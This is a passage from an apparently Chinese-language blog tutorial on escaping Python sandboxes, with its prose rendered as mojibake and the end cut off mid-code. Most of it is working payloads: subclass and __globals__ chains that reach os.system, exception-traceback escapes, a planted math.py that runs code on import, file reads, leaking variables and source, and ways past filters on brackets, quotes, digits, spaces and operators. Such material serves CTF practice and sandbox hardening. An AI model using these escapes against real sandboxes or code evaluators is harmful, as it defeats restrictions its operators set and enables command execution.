class="hljs-number">-1</span>].<span class="hljs-symbol">__subclasses__</span>() if i.<span class="hljs-symbol">__name__</span> == <span class="hljs-string">&quot;catch_warnings&quot;</span>]<br></code></pre></td></tr></table></figure><br />
é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œ<code>warnings</code>è¿™ä¸ªåº“ä¸­æœ‰ä¸ªå‡½æ•°ï¼š<code>warnings.catch_warnings</code>ï¼Œå®ƒæœ‰ä¸ª<code>_module</code>å±æ€§ï¼š<br />
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">    def __init__(<span class="hljs-keyword">self</span>, <span class="hljs-keyword">record</span>=<span class="hljs-keyword">False</span>, <span class="hljs-keyword">module</span>=None):<br>...<br>        <span class="hljs-keyword">self</span>._module = sys.modules[<span class="hljs-string">&#x27;warnings&#x27;</span>] <span class="hljs-keyword">if</span> <span class="hljs-keyword">module</span> <span class="hljs-keyword">is</span> None <span class="hljs-keyword">else</span> <span class="hljs-keyword">module</span><br>...<br></code></pre></td></tr></table></figure></p>
<p>æ‰€ä»¥é€šè¿‡<code>_module</code>ä¹Ÿå¯ä»¥æ„é€  payloadï¼ˆpy3.x ä¸­å·²ç»ç§»é™¤äº† <code>catch_warnings</code> çš„ <code>linecache</code>ï¼‰ï¼š<br />
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;&gt;&gt; <span class="hljs-selector-attr">[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span>]</span><span class="hljs-selector-attr">[0]</span>()._module<span class="hljs-selector-class">.linecache</span><span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>macr0phag3<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></p>
<p>3.x ä¸­çš„<code>warnings</code>è™½ç„¶æ²¡æœ‰ <code>linecache</code>ï¼Œä¹Ÿæœ‰<code>__builtins__</code>ã€‚</p>
<p>åŒæ ·ï¼Œpy3.x ä¸­æœ‰<code>&lt;class 'os._wrap_close'&gt;</code>ï¼Œåˆ©ç”¨æ–¹å¼å¯ä»¥ä¸ºï¼š<br />
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">-1</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">133</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>macr0phag3<br><span class="hljs-number">0</span><br>&gt;&gt;&gt; # ä¸ºäº†é¿å… index ä½ç½®é—®é¢˜ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š<br>&gt;&gt;&gt; [i for i in <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">-1</span>].<span class="hljs-symbol">__subclasses__</span>() if i.<span class="hljs-symbol">__name__</span> == <span class="hljs-string">&quot;_wrap_close&quot;</span>][<span class="hljs-number">0</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
<p>å½“ç„¶è¿™æ ·ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ˆ3.xï¼‰ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">set</span>.mro()[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
<p>é¡ºä¾¿æä¸€ä¸‹ï¼Œ<code>object</code> æœ¬æ¥å°±æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå¦‚æœæ²¡è¿‡æ»¤çš„è¯ï¼Œpayload å¯ä»¥å†ç®€åŒ–ä¸ºï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
<p>è¿˜æœ‰ä¸€ç§æ˜¯åˆ©ç”¨<code>builtin_function_or_method</code> çš„ <code>__call__</code>ï¼š<br />
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[-<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">29</span>].<span class="hljs-variable">__call__</span>(eval, <span class="hljs-string">&#x27;1+1&#x27;</span>)<br></code></pre></td></tr></table></figure><br />
æˆ–è€…ç®€å•ä¸€ç‚¹ï¼š<br />
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.pop</span>.__class__.<span class="hljs-built_in">__call__</span>(eval, <span class="hljs-string">&#x27;1+1&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
<p>ä¸Šé¢è¿™äº› payload å¤§å¤šæ•°æ˜¯ç›´æ¥ index äº†ï¼Œä½†æ˜¯ç›´æ¥ç”¨ index ä¸å¤ªå¥å£®ï¼Œå¯ä»¥éƒ½æ¢æˆåˆ—è¡¨æ¨å¯¼å¼ï¼Œç”¨ <code>__name__</code> æ¥è·å–æƒ³è¦çš„ classï¼Œä¸Šé¢ä¹Ÿä¸¾äº†å¥½å‡ ä¸ªä¾‹å­äº†ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´å•¦ã€‚</p>
<p>æœ€åå†è¡¥å……å‡ ä¸ªã€‚</p>
<p>å¯ä»¥è¿™æ ·åˆ©ç”¨ï¼š<br />
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">class <span class="hljs-built_in">test</span>(dict):<br>    def <span class="hljs-built_in">__init__</span>(self):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">super</span>(test, self).keys.__class__.<span class="hljs-built_in">__call__</span>(eval, <span class="hljs-string">&#x27;1+1&#x27;</span>))<br>        # å¦‚æœæ˜¯ <span class="hljs-number">3</span>.x çš„è¯å¯ä»¥ç®€å†™ä¸ºï¼š<br>        # <span class="hljs-built_in">super</span>().keys.__class__.<span class="hljs-built_in">__call__</span>(eval, <span class="hljs-string">&#x27;1+1&#x27;</span>))<br><span class="hljs-built_in">test</span>()<br></code></pre></td></tr></table></figure></p>
<p>è¿˜å¯ä»¥åˆ©ç”¨å¼‚å¸¸é€ƒé€¸ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">hack = <span class="hljs-keyword">lambda</span> : [<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]<br><span class="hljs-keyword">try</span>:<br>    hack()<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    e.__traceback__.tb_next.tb_frame.f_globals[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
<p>è¿˜å¯ä»¥åˆ©ç”¨ <code>format</code>ï¼š</p>
<ol type="1">
<li><code>"&#123;0.__class__.__base__&#125;".format([])</code></li>
<li><code>"&#123;x.__class__.__base__&#125;".format(x=[])</code></li>
<li><code>"&#123;.__class__.__base__&#125;".format([])</code></li>
<li><code>("&#123;0.__class_"+"_.__base__&#125;").format([])</code></li>
</ol>
<p>ï¼ˆè¿™é‡Œé¡ºæ‰‹è®°å½•ä¸‹ï¼Œå¯¹äºå­—å…¸é”®æ˜¯æ•´æ•°å‹çš„æ¯”å¦‚ <code>&#123;"1":2&#125;</code>ï¼Œformat æ˜¯æ— æ³•æ‹¿åˆ°å€¼çš„ :)ï¼Œè¿™æ ·ä¼šæŠ¥é”™ï¼š<code>''' &#123;0['1']&#125; '''.format(&#123;"1":2&#125;)</code>ï¼Œ<code>'1'</code> å¼•å·å»æ‰çš„è¯åˆä¼šæŠ¥æ²¡æœ‰è¿™ä¸ªé”®ï¼Œè¿™ä¸ªç‰¹æ€§å¯ä»¥è§<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/string.html#format-string-syntax">æ–‡æ¡£</a>ï¼‰</p>
<p>ä¸Šé¢çš„è¿™äº›åˆ©ç”¨æ–¹å¼æ€»ç»“èµ·æ¥å°±æ˜¯é€šè¿‡ <code>.mro()</code>ã€<code>__class__</code>ã€<code>type(...)</code>ã€<code>__mro__</code>ã€<code>__subclasses__</code>ã€<code>__base__</code>ã€<code>__bases__</code> ç­‰å±æ€§/æ–¹æ³•å»è·å– <code>object</code>ï¼Œå†æ ¹æ®<code>__globals__</code>æ‰¾å¼•å…¥çš„<code>__builtins__</code>æˆ–è€…<code>eval</code>ç­‰ç­‰èƒ½å¤Ÿç›´æ¥è¢«åˆ©ç”¨çš„åº“ï¼Œæˆ–è€…æ‰¾åˆ°<code>builtin_function_or_method</code>ç±»/ç±»å‹<code>__call__</code>åç›´æ¥è¿è¡Œ<code>eval</code>ã€‚</p>
<p>æœ€åï¼Œå…¶å®æ²™ç®±é€ƒé€¸ï¼Œå¯¹äºä¸åŒçš„ç¬¬ä¸‰æ–¹åº“å¯èƒ½ä¼šå­˜åœ¨ä¸€äº›ç‰¹æ®Šçš„åˆ©ç”¨æ–¹å¼ï¼Œæ¯”å¦‚ <code>jinja2</code>ï¼Œè¿™ç±»å±äº <code>SSTI</code> æ¼æ´ï¼Œå¯ä»¥çœ‹è¿™ä¸ªï¼š<a href="https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/">ä¼ é€é—¨ğŸšª</a>ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚</p>
<p>å…¶å® SSTI ä¹Ÿä¼šç”¨åˆ°è¿™é‡Œçš„å¾ˆå¤šæŠ€å·§ï¼Œä¸¤è€…çŸ¥è¯†é¢ç›¸äº’äº¤å ã€‚</p>
<h2 id="æ–‡ä»¶è¯»å†™">æ–‡ä»¶è¯»å†™</h2>
<p>2.x æœ‰ä¸ªå†…å»ºçš„ <code>file</code>ï¼š<br />
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs delphi">&gt;&gt;&gt; <span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;key&#x27;</span>).<span class="hljs-keyword">read</span>()<br><span class="hljs-string">&#x27;Macr0phag3\n&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).<span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;Macr0phag3&#x27;</span>)<br>&gt;&gt;&gt; <span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;key&#x27;</span>).<span class="hljs-keyword">read</span>()<br><span class="hljs-string">&#x27;Macr0phag3&#x27;</span><br></code></pre></td></tr></table></figure></p>
<p>è¿˜æœ‰ä¸ª <code>open</code>ï¼Œ2.x ä¸ 3.x é€šç”¨ã€‚</p>
<p>è¿˜æœ‰ä¸€äº›åº“ï¼Œä¾‹å¦‚ï¼š<code>types.FileType</code>(rw)ã€<code>platform.popen</code>(rw)ã€<code>linecache.getlines</code>(r)ã€‚</p>
<p>ä¸ºä»€ä¹ˆè¯´å†™æ¯”è¯»å±å®³å¤§å‘¢ï¼Ÿå› ä¸ºå¦‚æœèƒ½å†™ï¼Œå¯ä»¥å°†ç±»ä¼¼çš„æ–‡ä»¶ä¿å­˜ä¸º<code>math.py</code>ï¼Œç„¶å import è¿›æ¥ï¼š<br />
math.pyï¼š<br />
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">import</span> <span class="hljs-built_in">os</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))<br></code></pre></td></tr></table></figure><br />
è°ƒç”¨<br />
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> math</span><br>macr0phag3<br>0<br></code></pre></td></tr></table></figure><br />
è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œ py æ–‡ä»¶å‘½åæ˜¯æœ‰æŠ€å·§çš„ã€‚ä¹‹æ‰€ä»¥è¦æŒ‘ä¸€ä¸ªå¸¸ç”¨çš„æ ‡å‡†åº“æ˜¯å› ä¸ºè¿‡æ»¤åº“åå¯èƒ½é‡‡ç”¨çš„æ˜¯ç™½åå•ã€‚å¹¶ä¸”ä¹‹å‰è¯´è¿‡æœ‰äº›åº“æ˜¯åœ¨<code>sys.modules</code>ä¸­æœ‰çš„ï¼Œè¿™äº›åº“æ— æ³•è¿™æ ·åˆ©ç”¨ï¼Œä¼šç›´æ¥ä»<code>sys.modules</code>ä¸­åŠ å…¥ï¼Œæ¯”å¦‚<code>re</code>ï¼š<br />
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">in</span> sys.modules</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;math&#x27;</span> <span class="hljs-keyword">in</span> sys.modules</span><br>False<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span><br></code></pre></td></tr></table></figure><br />
å½“ç„¶åœ¨<code>import re</code> ä¹‹å‰<code>del sys.modules['re']</code>ä¹Ÿä¸æ˜¯ä¸å¯ä»¥...</p>
<p>æœ€åï¼Œè¿™é‡Œçš„æ–‡ä»¶å‘½åéœ€è¦æ³¨æ„çš„åœ°æ–¹å’Œæœ€å¼€å§‹çš„é‚£ä¸ªéå†æµ‹è¯•çš„æ–‡ä»¶ä¸€æ ·ï¼šç”±äºå¾…æµ‹è¯•çš„åº“ä¸­æœ‰ä¸ªå« <code>test</code>çš„ï¼Œå¦‚æœæŠŠéå†æµ‹è¯•çš„æ–‡ä»¶ä¹Ÿå‘½åä¸º testï¼Œä¼šå¯¼è‡´é‚£ä¸ªæ–‡ä»¶è¿è¡Œ 2 æ¬¡ï¼Œå› ä¸ºè‡ªå·± import äº†è‡ªå·±ã€‚</p>
<p>è¯»æ–‡ä»¶æš‚æ—¶æ²¡ä»€ä¹ˆå‘ç°ç‰¹åˆ«çš„åœ°æ–¹ã€‚</p>
<p>å‰©ä¸‹çš„å°±æ˜¯æ ¹æ®ä¸Šé¢çš„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤é‡‡ç”¨çš„ç»•è¿‡æ–¹æ³•å»å¯»æ‰¾ payload äº†ï¼Œæ¯”å¦‚ï¼š<br />
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&gt;&gt;&gt; __builtins__.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key&#x27;</span>).<span class="hljs-built_in">read</span>()<br><span class="hljs-string">&#x27;Macr0phag3\n&#x27;</span><br></code></pre></td></tr></table></figure><br />
æˆ–è€…<br />
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&gt;&gt;&gt; ().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;Macr0phag3&#x27;</span><br></code></pre></td></tr></table></figure></p>
<h2 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²">æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2>
<p>è¿™ä¸ªä¹Ÿç®—åªèƒ½è¯»å§ã€‚</p>
<ol type="1">
<li><code>dir()</code></li>
<li><code>__import__("__main__").x</code>ï¼Œå…¶ä¸­ <code>__main__</code> è¿˜ä¼šæ³„éœ²è„šæœ¬çš„ç»å¯¹è·¯å¾„ï¼š<code>&lt;module '__main__' from 'xxx.py'&gt;</code></li>
<li><code>__file__</code>ï¼Œæ–‡ä»¶ç»å¯¹è·¯å¾„</li>
<li><code>x.__dict__</code></li>
<li><code>locals()</code></li>
<li><code>globals()</code></li>
<li><code>vars()</code></li>
<li><code>sys._getframe(0).f_code.co_varnames</code></li>
<li><code>sys._getframe(0).f_locals</code></li>
<li><code>inspect.x</code>ï¼Œinspect æœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥è·å–ä¿¡æ¯ï¼Œæ¯”å¦‚è·å–æºç å¯ä»¥ç”¨ <code>inspect.getsource</code>ï¼Œè¿˜æœ‰å…¶ä»–å¾ˆå¤šçš„åŠŸèƒ½</li>
<li>...</li>
</ol>
<p>è¿™æœ‰ä¸€ç¯‡ä¸é”™çš„æ–‡ç« ï¼Œæ¨èé˜…è¯»ï¼š</p>
<p>https://www.cnblogs.com/dechinphy/p/modify-locals.html</p>
<h2 id="å…¶ä»–">å…¶ä»–</h2>
<p>è¿™äº›è¡Œä¸ºä¸åƒæ˜¯ oj ä¼šåšå¾—å‡ºæ¥çš„ï¼Œctf å€’æ˜¯æœ‰å¯èƒ½å‡ºç°ã€‚</p>
<h3 id="è¿‡æ»¤">è¿‡æ»¤ [ ]</h3>
<p>åº”å¯¹çš„æ–¹å¼å°±æ˜¯å°†<code>[]</code>çš„åŠŸèƒ½ç”¨<code>pop</code>ã€<code>__getitem__</code> ä»£æ›¿ï¼ˆå®é™…ä¸Š<code>a[0]</code>å°±æ˜¯åœ¨å†…éƒ¨è°ƒç”¨äº†<code>a.__getitem__(0)</code>ï¼‰ï¼š<br />
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">59</span>).__init__<span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;linecache&#x27;</span>)<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br><span class="hljs-string">&#x27;macr0phag3\n&#x27;</span><br></code></pre></td></tr></table></figure></p>
<p>å½“ç„¶ï¼Œdict ä¹Ÿæ˜¯å¯ä»¥ pop çš„ï¼š<code>&#123;"a": 1&#125;.pop("a")</code></p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ <code>next(iter())</code> æ›¿ä»£ï¼Œæˆ–è®¸å¯ä»¥åŠ ä¸Š <code>max</code> ä¹‹ç±»çš„ç©æ„ã€‚</p>
<h3 id="è¿‡æ»¤å¼•å·">è¿‡æ»¤å¼•å·</h3>
<blockquote>
<p>chr</p>
</blockquote>
<p>æœ€ç®€å•å°±æ˜¯ç”¨ <code>chr</code> å•¦<br />
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">os<span class="hljs-selector-class">.system</span>(<br>    chr(<span class="hljs-number">119</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">109</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>)<br>)<br></code></pre></td></tr></table></figure></p>
<blockquote>
<p>æ‰£å­—ç¬¦</p>
</blockquote>
<p>åˆ©ç”¨ <code>str</code> å’Œ <code>[]</code>ï¼ŒæŒ¨ä¸ªæŠŠå­—ç¬¦æ‹¼æ¥å‡ºæ¥<br />
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">os<span class="hljs-selector-class">.system</span>(<br>    str(()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__new__</span>)<span class="hljs-selector-attr">[21]</span>+<span class="hljs-built_in">str</span>(()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__new__</span>)<span class="hljs-selector-attr">[13]</span>+<span class="hljs-built_in">str</span>(()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__new__</span>)<span class="hljs-selector-attr">[14]</span>+<span class="hljs-built_in">str</span>(()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__new__</span>)<span class="hljs-selector-attr">[40]</span>+<span class="hljs-built_in">str</span>(()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__new__</span>)<span class="hljs-selector-attr">[10]</span>+<span class="hljs-built_in">str</span>(()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__new__</span>)<span class="hljs-selector-attr">[3]</span><br>)<br></code></pre></td></tr></table></figure><br />
å½“ç„¶ <code>[]</code> å¦‚æœè¢«è¿‡æ»¤äº†ä¹Ÿå¯ä»¥ bypassï¼Œå‰é¢è¯´è¿‡äº†ã€‚</p>
<p>å¦‚æœ str è¢«è¿‡æ»¤äº†æ€ä¹ˆåŠå‘¢ï¼Ÿ<code>type('')()</code>ã€<code>format()</code> å³å¯ã€‚åŒç†ï¼Œ<code>int</code>ã€<code>list</code> éƒ½å¯ä»¥ç”¨ <code>type</code> æ„é€ å‡ºæ¥ã€‚</p>
<blockquote>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²</p>
</blockquote>
<p>é‚£è¿‡æ»¤äº†å¼•å·ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²è¿˜èƒ½ç”¨å—ï¼Ÿ</p>
<p><code>(chr(37)+str(&#123;&#125;.__class__)[1])%100 == 'd'</code></p>
<p>åˆèµ·é£äº†...</p>
<blockquote>
<p>dict() æ‹¿é”®å®ƒä¸é¦™å—ï¼Ÿ</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;whoami&#x27;</span> ==<br><span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(whoami=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>] ==<br><span class="hljs-built_in">str</span>(<span class="hljs-built_in">dict</span>(whoami=<span class="hljs-number">1</span>))[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>] ==<br></code></pre></td></tr></table></figure>
<h3 id="é™åˆ¶æ•°å­—">é™åˆ¶æ•°å­—</h3>
<p>ä¸Šé¢æåˆ°äº†å­—ç¬¦ä¸²è¿‡æ»¤ç»•è¿‡ï¼Œé¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œå¦‚æœæ˜¯è¿‡æ»¤äº†æ•°å­—ï¼ˆè™½ç„¶è¿™ç§æƒ…å†µå¾ˆå°‘è§ï¼‰ï¼Œé‚£ç»•è¿‡çš„æ–¹å¼å°±æ›´å¤šäº†ï¼Œæˆ‘è¿™é‡Œéšä¾¿åˆ—ä¸‹ï¼š</p>
<ol type="1">
<li>0ï¼š<code>int(bool([]))</code>ã€<code>Flase</code>ã€<code>len([])</code>ã€<code>any(())</code></li>
<li>1ï¼š<code>int(bool([""]))</code>ã€<code>True</code>ã€<code>all(())</code>ã€<code>int(list(list(dict(aá=())).pop()).pop())</code></li>
<li>è·å–ç¨å¾®å¤§çš„æ•°å­—ï¼š<code>len(str(&#123;&#125;.keys))</code>ï¼Œä¸è¿‡éœ€è¦æ…¢æ…¢æ‰¾é•¿åº¦ç¬¦åˆçš„å­—ç¬¦ä¸²</li>
<li>1.0ï¼š<code>float(True)</code></li>
<li>-1ï¼š<code>~0</code></li>
<li>...</li>
</ol>
<p>å…¶å®æœ‰äº† <code>0</code> å°±å¯ä»¥äº†ï¼Œè¦å•¥æ•´æ•°ç›´æ¥åšè¿ç®—å³å¯ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0</span> ** <span class="hljs-number">0</span> == <span class="hljs-number">1</span><br><span class="hljs-number">1</span> + <span class="hljs-number">1</span> == <span class="hljs-number">2</span><br><span class="hljs-number">2</span> + <span class="hljs-number">1</span> == <span class="hljs-number">3</span><br><span class="hljs-number">2</span> ** <span class="hljs-number">2</span> == <span class="hljs-number">4</span><br>...<br></code></pre></td></tr></table></figure></p>
<p>ä»»æ„æµ®ç‚¹æ•°ç¨å¾®éº»çƒ¦ç‚¹ï¼Œéœ€è¦æƒ³åŠæ³•è¿ç®—ï¼Œä½†æ˜¯ä¸€å®šå¯ä»¥æå‡ºæ¥ï¼Œé™¤éæ˜¯ Ï€ è¿™ç§ç©æ„...</p>
<h3 id="é™åˆ¶ç©ºæ ¼">é™åˆ¶ç©ºæ ¼</h3>
<p>ç©ºæ ¼é€šå¸¸æ¥è¯´å¯ä»¥é€šè¿‡ <code>()</code>ã€<code>[]</code> æ›¿æ¢æ‰ã€‚ä¾‹å¦‚ï¼š</p>
<p><code>[i for i in range(10) if i == 5]</code> å¯ä»¥æ›¿æ¢ä¸º <code>[[i][0]for(i)in(range(10))if(i)==5]</code></p>
<h3 id="é™åˆ¶è¿ç®—ç¬¦">é™åˆ¶è¿ç®—ç¬¦</h3>
<p><code>&gt; &lt; ! - +</code> è¿™å‡ ä¸ªæ¯”è¾ƒç®€å•å°±ä¸è¯´äº†ã€‚</p>
<p><code>==</code> å¯ä»¥ç”¨ <code>in</code> æ¥æ›¿æ¢ã€‚</p>
<p>æ›¿æ¢ <code>or</code> çš„æµ‹è¯•ä»£ç <br />
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">100</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">100</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)]:<br>    ans = i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>] <span class="hljs-keyword">or</span> i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bool</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>]&#125;</span> | <span class="hljs-subst">&#123;i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)) == ans)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bool</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">f&#x27;- <span 